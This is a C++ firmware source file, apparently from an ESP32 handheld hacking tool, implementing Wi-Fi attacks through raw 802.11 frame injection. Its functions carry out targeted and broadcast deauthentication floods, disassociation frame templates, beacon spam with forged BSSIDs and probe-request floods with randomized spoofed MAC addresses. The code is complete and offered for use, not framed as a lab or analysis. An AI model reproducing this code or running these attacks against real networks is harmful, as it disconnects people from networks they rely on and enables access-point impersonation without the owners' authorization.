#include "bruce_wifi.h"
#if !defined(NEONDRIVE_TARGET_M5TAB5)
#include <esp_wifi.h>
#include <cstring>
#include <freertos/FreeRTOS.h>
#include <freertos/semphr.h>
#include <stdarg.h>

// ==========================================
// Bruce WiFi Attack Implementation (Enhanced)
// ==========================================

// State tracking
static BruceAttackType gCurrentAttack = BruceAttackType::NONE;
static uint32_t gAttackStartMs = 0;
static uint16_t gAttackDurationMs = 0;
static BruceTarget gTarget = {};
static bool gAttackActive = false;
static BruceConfig gConfig;
static BruceStats gStats = {};
static char gLastError[128] = {0};
static uint8_t gRandomMAC[6] = {};

// Semaphore for thread safety
static SemaphoreHandle_t attackMutex = nullptr;

// Optional per-frame TX callback (set by main.cpp for PCAP logging)
static BruceFrameTxCallback gFrameCb = nullptr;

// Deauth frame template (26 bytes) - from deauther.cpp pattern
const uint8_t DEAUTH_FRAME_TEMPLATE[26] = {
    0xC0, 0x00,                           // Frame control (deauth)
    0x00, 0x00,                           // Duration
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,   // Dest (broadcast or target)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // Src (will fill with BSSID/random)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // BSSID (target)
    0x00, 0x00,                           // Sequence
    0x02, 0x00                            // Reason code
};

// Disassoc frame template (same structure, different frame control)
const uint8_t DISASSOC_TEMPLATE[26] = {
    0xA0, 0x00,                           // Frame control (disassoc)
    0x00, 0x00,                           // Duration
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,   // Dest (broadcast or target)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // Src
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // BSSID
    0x00, 0x00,                           // Sequence
    0x02, 0x00                            // Reason code
};

// === Utility Functions ===

static void logError(const char* fmt, ...) {
    va_list args;
    va_start(args, fmt);
    vsnprintf(gLastError, sizeof(gLastError), fmt, args);
    va_end(args);
    
    if (gConfig.verboseLogging) {
        Serial.printf("[BRUCE] ERROR: %s\n", gLastError);
    }
}

static void logInfo(const char* fmt, ...) {
    if (!gConfig.verboseLogging) return;
    
    va_list args;
    va_start(args, fmt);
    char buf[256];
    vsnprintf(buf, sizeof(buf), fmt, args);
    va_end(args);
    
    Serial.printf("[BRUCE] %s\n", buf);
}

static void generateRandomMAC(uint8_t* mac) {
    for (int i = 0; i < 6; i++) {
        mac[i] = random(0x00, 0xFF);
    }
    // Set locally administered, unicast bit
    mac[0] |= 0x02;
    mac[0] &= 0xFE;
}

String bruceFormatMAC(const uint8_t* mac) {
    char buf[18];
    snprintf(buf, sizeof(buf), "%02X:%02X:%02X:%02X:%02X:%02X",
             mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
    return String(buf);
}

void bruceInit() {
    if (!attackMutex) {
        attackMutex = xSemaphoreCreateMutex();
    }
    gCurrentAttack = BruceAttackType::NONE;
    gAttackActive = false;
    memset(&gStats, 0, sizeof(gStats));
    memset(gLastError, 0, sizeof(gLastError));
    generateRandomMAC(gRandomMAC);
    gConfig = BruceConfig();  // Default config
    
    logInfo("Bruce WiFi Attack Module initialized");
}

// Build a deauth frame (following deauther.cpp pattern)
static void buildDeauthFrame(uint8_t* frame, const uint8_t* destMAC, const uint8_t* srcMAC, const uint8_t* bssid, uint8_t reasonCode) {
    memcpy(frame, DEAUTH_FRAME_TEMPLATE, 26);
    
    // Set destination MAC (usually broadcast or target)
    memcpy(&frame[4], destMAC, 6);
    
    // Set source MAC (usually AP's BSSID or spoofed)
    memcpy(&frame[10], srcMAC, 6);
    
    // Set BSSID
    memcpy(&frame[16], bssid, 6);
    
    // Randomize sequence number (12-bit counter)
    static uint16_t seq = 0;
    seq = (seq + 1) & 0x0FFF;
    frame[22] = (seq >> 4) & 0xFF;
    frame[23] = ((seq & 0x0F) << 4);
    
    // Reason code
    frame[24] = reasonCode & 0xFF;
    frame[25] = (reasonCode >> 8) & 0xFF;
}

// Build beacon frame (encodes SSID properly)
static uint16_t buildBeaconFrame(uint8_t* frame, const char* ssid, uint8_t channel, const uint8_t* bssid) {
    size_t pos = 0;
    
    // Frame control (beacon = 0x8081)
    frame[pos++] = 0x80;
    frame[pos++] = 0x00;
    
    // Duration (fixed)
    frame[pos++] = 0x00;
    frame[pos++] = 0x00;
    
    // Destination (broadcast)
    memset(&frame[pos], 0xFF, 6);
    pos += 6;
    
    // Source (AP MAC / BSSID)
    memcpy(&frame[pos], bssid, 6);
    pos += 6;
    
    // BSSID
    memcpy(&frame[pos], bssid, 6);
    pos += 6;
    
    // Sequence number (12-bit)
    static uint16_t seq = 0;
    seq = (seq + 1) & 0x0FFF;
    frame[pos++] = (seq >> 4) & 0xFF;
    frame[pos++] = ((seq & 0x0F) << 4);
    
    // Timestamp (8 bytes)
    memset(&frame[pos], 0x00, 8);
    pos += 8;
    
    // Beacon interval (2 bytes, 100 TU = 102.4ms)
    frame[pos++] = 0x64;
    frame[pos++] = 0x00;
    
    // Capability info (infrastructure BSS, privacy)
    frame[pos++] = 0x31;
    frame[pos++] = 0x00;
    
    // === Information Elements ===
    
    // SSID element (tag 0)
    frame[pos++] = 0x00;  // Tag: SSID
    size_t ssid_len = ssid ? strlen(ssid) : 0;
    if (ssid_len > 32) ssid_len = 32;
    frame[pos++] = ssid_len;  // Length
    if (ssid_len > 0) {
        memcpy(&frame[pos], ssid, ssid_len);
    }
    pos += ssid_len;
    
    // Supported rates (tag 1)
    frame[pos++] = 0x01;
    frame[pos++] = 0x04;
    frame[pos++] = 0x82;  // 1 Mbps
    frame[pos++] = 0x84;  // 2 Mbps
    frame[pos++] = 0x8B;  // 5.5 Mbps
    frame[pos++] = 0x96;  // 11 Mbps
    
    // DS Param Set (tag 3)
    frame[pos++] = 0x03;
    frame[pos++] = 0x01;
    frame[pos++] = channel;
    
    return pos;  // Return frame length
}

// Build probe request frame
static uint16_t buildProbeFrame(uint8_t* frame, const char* ssid, const uint8_t* srcMAC) {
    size_t pos = 0;
    
    // Frame control (probe request = 0x0040)
    frame[pos++] = 0x40;
    frame[pos++] = 0x00;
    
    // Duration
    frame[pos++] = 0x00;
    frame[pos++] = 0x00;
    
    // Destination (broadcast)
    memset(&frame[pos], 0xFF, 6);
    pos += 6;
    
    // Source (spoofed or real MAC)
    memcpy(&frame[pos], srcMAC, 6);
    pos += 6;
    
    // BSSID (broadcast)
    memset(&frame[pos], 0xFF, 6);
    pos += 6;
    
    // Sequence number
    static uint16_t seq = 0;
    seq = (seq + 1) & 0x0FFF;
    frame[pos++] = (seq >> 4) & 0xFF;
    frame[pos++] = ((seq & 0x0F) << 4);
    
    // SSID element
    frame[pos++] = 0x00;
    size_t ssid_len = ssid ? strlen(ssid) : 0;
    if (ssid_len > 32) ssid_len = 32;
    frame[pos++] = ssid_len;
    if (ssid_len > 0) {
        memcpy(&frame[pos], ssid, ssid_len);
    }
    pos += ssid_len;
    
    // Supported rates
    frame[pos++] = 0x01;
    frame[pos++] = 0x04;
    frame[pos++] = 0x82;
    frame[pos++] = 0x84;
    frame[pos++] = 0x8B;
    frame[pos++] = 0x96;
    
    return pos;
}

// Start a hidden AP on the given channel for injection
static bool startAttackAP(uint8_t channel) {
    WiFi.mode(WIFI_AP);
    // Use a hidden dummy AP
    bool ok = WiFi.softAP("dummy", NULL, channel, 1);
    delay(200); // allow AP to come up
    return ok;
}

// Stop the attack AP
static void stopAttackAP() {
    WiFi.softAPdisconnect(true);
    WiFi.mode(WIFI_STA);
    delay(50);
}

// Send a raw WiFi frame using esp_wifi_80211_tx (always via AP interface)
static esp_err_t sendRawFrame(const uint8_t* frame, size_t len) {
    esp_err_t r = esp_wifi_80211_tx(WIFI_IF_AP, (uint8_t*)frame, len, false);
    // Fire callback on success so main.cpp can queue frame for PCAP
    if (r == ESP_OK && gFrameCb) {
        gFrameCb(frame, len, gTarget.channel);
    }
    return r;
}

void bruceSetFrameCallback(BruceFrameTxCallback cb) {
    gFrameCb = cb;
}

static void stopAttackLocked() {
    if (gAttackActive) {
        uint32_t elapsed = millis() - gAttackStartMs;
        logInfo("Attack stopped (elapsed: %dms, frames: %lu, packets: %lu, rate: %.1f fps)",
                elapsed, gStats.framesSent, gStats.packetsSent,
                (float)(gStats.framesSent * 1000) / (elapsed + 1));
        // Stop the temporary AP
        stopAttackAP();
        gAttackActive = false;
        gCurrentAttack = BruceAttackType::NONE;
    }
}

void bruceStartDeauthFlood(const BruceTarget& target, uint16_t durationMs) {
    if (xSemaphoreTake(attackMutex, pdMS_TO_TICKS(100)) != pdTRUE) {
        logError("Attack mutex timeout");
        return;
    }
    
    stopAttackLocked();
    
    memcpy(gTarget.bssid, target.bssid, 6);
    strncpy(gTarget.ssid, target.ssid, 23);
    gTarget.channel = target.channel;
    
    // Start a hidden AP on the target channel
    if (!startAttackAP(target.channel)) {
        logError("Failed to start attack AP");
        xSemaphoreGive(attackMutex);
        return;
    }
    
    gCurrentAttack = BruceAttackType::DEAUTH_FLOOD;
    gAttackStartMs = millis();
    gAttackDurationMs = durationMs;
    gAttackActive = true;
    memset(&gStats, 0, sizeof(gStats));
    gStats.startTimeMs = gAttackStartMs;
    
    logInfo("Deauth flood on %s (%s) CH%d for %dms",
            target.ssid, bruceFormatMAC(target.bssid).c_str(), target.channel, durationMs);
    
    xSemaphoreGive(attackMutex);
}

void bruceStartBeaconSpam(const char* ssid, uint8_t channel, uint16_t durationMs, const BruceTarget* broadcastBssid) {
    if (xSemaphoreTake(attackMutex, pdMS_TO_TICKS(100)) != pdTRUE) {
        logError("Attack mutex timeout");
        return;
    }
    
    stopAttackLocked();
    
    if (broadcastBssid) {
        memcpy(gTarget.bssid, broadcastBssid->bssid, 6);
        strncpy(gTarget.ssid, broadcastBssid->ssid, 23);
    } else {
        generateRandomMAC(gTarget.bssid);
        strncpy(gTarget.ssid, ssid ? ssid : "test", 23);
    }
    gTarget.channel = channel;
    
    if (!startAttackAP(channel)) {
        logError("Failed to start attack AP");
        xSemaphoreGive(attackMutex);
        return;
    }
    
    gCurrentAttack = BruceAttackType::BEACON_SPAM;
    gAttackStartMs = millis();
    gAttackDurationMs = durationMs;
    gAttackActive = true;
    memset(&gStats, 0, sizeof(gStats));
    gStats.startTimeMs = gAttackStartMs;
    
    logInfo("Beacon spam for SSID '%s' (BSSID: %s) on CH%d for %dms",
            ssid ? ssid : "unknown",
            bruceFormatMAC(gTarget.bssid).c_str(),
            channel, durationMs);
    
    xSemaphoreGive(attackMutex);
}

void bruceStartProbeFlood(const char* ssid, uint8_t channel, uint16_t durationMs) {
    if (xSemaphoreTake(attackMutex, pdMS_TO_TICKS(100)) != pdTRUE) {
        logError("Attack mutex timeout");
        return;
    }
    
    stopAttackLocked();
    
    generateRandomMAC(gTarget.bssid);
    strncpy(gTarget.ssid, ssid ? ssid : "probe_test", 23);
    gTarget.channel = channel;
    
    if (!startAttackAP(channel)) {
        logError("Failed to start attack AP");
        xSemaphoreGive(attackMutex);
        return;
    }
    
    gCurrentAttack = BruceAttackType::PROBE_FLOOD;
    gAttackStartMs = millis();
    gAttackDurationMs = durationMs;
    gAttackActive = true;
    memset(&gStats, 0, sizeof(gStats));
    gStats.startTimeMs = gAttackStartMs;
    
    logInfo("Probe flood for SSID '%s' on CH%d for %dms",
            ssid ? ssid : "unknown", channel, durationMs);
    
    xSemaphoreGive(attackMutex);
}

void bruceStartDeauthBroadcast(uint8_t channel, uint16_t durationMs) {
    if (xSemaphoreTake(attackMutex, pdMS_TO_TICKS(100)) != pdTRUE) {
        logError("Attack mutex timeout");
        return;
    }
    
    stopAttackLocked();
    
    memset(gTarget.bssid, 0xFF, 6);  // Broadcast BSSID
    strncpy(gTarget.ssid, "broadcast", 23);
    gTarget.channel = channel;
    
    if (!startAttackAP(channel)) {
        logError("Failed to start attack AP");
        xSemaphoreGive(attackMutex);
        return;
    }
    
    gCurrentAttack = BruceAttackType::DEAUTH_BROADCAST;
    gAttackStartMs = millis();
    gAttackDurationMs = durationMs;
    gAttackActive = true;
    memset(&gStats, 0, sizeof(gStats));
    gStats.startTimeMs = gAttackStartMs;
    
    logInfo("Broadcast deauth on CH%d for %dms", channel, durationMs);
    
    xSemaphoreGive(attackMutex);
}

void bruceStopAttack() {
    if (xSemaphoreTake(attackMutex, pdMS_TO_TICKS(100)) != pdTRUE) {
        return;
    }
    stopAttackLocked();
    xSemaphoreGive(attackMutex);
}

bool bruceIsAttacking() {
    return gAttackActive;
}

const char* bruceGetAttackName() {
    switch (gCurrentAttack) {
        case BruceAttackType::DEAUTH_FLOOD:
            return "Deauth Flood";
        case BruceAttackType::DEAUTH_BROADCAST:
            return "Deauth Broadcast";
        case BruceAttackType::BEACON_SPAM:
            return "Beacon Spam";
        case BruceAttackType::PROBE_FLOOD:
            return "Probe Flood";
        default:
            return "Idle";
    }
}

BruceStats bruceGetStats() {
    if (gAttackActive && gAttackStartMs > 0) {
        gStats.elapsedMs = millis() - gAttackStartMs;
        if (gStats.elapsedMs > 0) {
            gStats.framesPerSecond = (gStats.framesSent * 1000.0f) / gStats.elapsedMs;
        }
    }
    return gStats;
}

BruceAttackType bruceGetCurrentAttackType() {
    return gCurrentAttack;
}

const char* bruceGetLastError() {
    return gLastError;
}

void bruceSetConfig(const BruceConfig& cfg) {
    if (xSemaphoreTake(attackMutex, pdMS_TO_TICKS(100)) != pdTRUE) {
        return;
    }
    gConfig = cfg;
    logInfo("Config updated: interval=%dms, tx_power=%d, verbose=%d",
            gConfig.floodIntervalMs, gConfig.beaconTxPower, gConfig.verboseLogging ? 1 : 0);
    xSemaphoreGive(attackMutex);
}

BruceConfig bruceGetConfig() {
    return gConfig;
}

// Main attack loop (call frequently from main loop)
void bruceAttackTick() {
    if (!gAttackActive) return;
    
    if (xSemaphoreTake(attackMutex, pdMS_TO_TICKS(50)) != pdTRUE) {
        return;
    }
    
    uint32_t elapsed = millis() - gAttackStartMs;
    
    // Check if attack duration expired
    if (elapsed >= gAttackDurationMs) {
        stopAttackLocked();
        xSemaphoreGive(attackMutex);
        return;
    }
    
    static uint32_t lastSend = 0;
    uint8_t frame[256];
    uint16_t frameLen;
    
    // Execute attack tick
    switch (gCurrentAttack) {
        case BruceAttackType::DEAUTH_FLOOD: {
            // Send both target-specific and broadcast deauth
            if (millis() - lastSend > gConfig.floodIntervalMs) {
                lastSend = millis();
                
                // Deauth to target
                uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
                buildDeauthFrame(frame, gTarget.bssid, gTarget.bssid, gTarget.bssid, gConfig.deauthReasonCode);
                sendRawFrame(frame, 26);
                gStats.framesSent++;
                
                // Deauth to broadcast (more effective)
                buildDeauthFrame(frame, broadcast, gTarget.bssid, gTarget.bssid, gConfig.deauthReasonCode);
                sendRawFrame(frame, 26);
                gStats.framesSent++;
                
                gStats.packetsSent++;
            }
            break;
        }
        
        case BruceAttackType::DEAUTH_BROADCAST: {
            // Broadcast deauth: random source, broadcast dest/BSSID
            if (millis() - lastSend > gConfig.floodIntervalMs) {
                lastSend = millis();
                uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
                
                // Randomize source MAC each time for better effect
                generateRandomMAC(gRandomMAC);
                buildDeauthFrame(frame, broadcast, gRandomMAC, broadcast, 0x07);
                sendRawFrame(frame, 26);
                gStats.framesSent++;
                gStats.packetsSent++;
            }
            break;
        }
        
        case BruceAttackType::BEACON_SPAM: {
            // Full beacon frame with SSID
            if (millis() - lastSend > gConfig.floodIntervalMs) {
                lastSend = millis();
                
                frameLen = buildBeaconFrame(frame, gTarget.ssid, gTarget.channel, gTarget.bssid);
                sendRawFrame(frame, frameLen);
                gStats.framesSent++;
                gStats.packetsSent++;
            }
            break;
        }
        
        case BruceAttackType::PROBE_FLOOD: {
            // Probe request flooding with spoofed MACs
            if (millis() - lastSend > gConfig.floodIntervalMs) {
                lastSend = millis();
                
                // Use random MAC for each probe
                generateRandomMAC(gRandomMAC);
                frameLen = buildProbeFrame(frame, gTarget.ssid, gRandomMAC);
                sendRawFrame(frame, frameLen);
                gStats.framesSent++;
                gStats.packetsSent++;
            }
            break;
        }
        
        default:
            break;
    }
    
    xSemaphoreGive(attackMutex);
}

// UI stubs (called from main.cpp)
// drawBruceMenu() is implemented in main.cpp where it has access to the
// Button struct, bruceMenuBtns[], tft, and the draw helpers.

void bruceMenuTick() {
    // Attack loop
    bruceAttackTick();
}

#endif // !NEONDRIVE_TARGET_M5TAB5